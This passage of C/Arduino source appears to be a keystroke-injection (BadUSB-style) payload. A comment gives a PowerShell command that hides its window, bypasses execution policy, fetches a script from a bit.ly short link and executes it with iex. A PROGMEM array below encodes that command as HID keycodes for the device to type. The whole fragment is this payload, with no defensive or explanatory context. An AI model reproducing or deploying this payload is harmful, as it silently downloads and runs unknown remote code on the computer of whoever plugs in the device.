...
// powershell -w h -NoP -NonI -Exec Bypass iwr bit.ly/3WWoBGK | iex
const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 0,56, 0,26, 0,44, 0,11, 0,44, 0,56, 2,17, 0,18, 2,19, 0,44, 0,56, 2,17, 0,18, 0,17, 2,12, 0,44, 0,56, 2,8, 0,27, 0,8, 0,6, 0,44, 2,5, 0,29, 0,19, 0,4, 0,22, 0,22, 0,44, 0,12, 0,26, 0,21, 0,44, 0,5, 0,12, 0,23, 0,55, 0,15, 0,29, 2,36, 0,32, 2,26, 2,26, 0,18, 2,5, 2,10, 2,14, 0,44, 64,100, 0,44, 0,12, 0,8, 0,27};
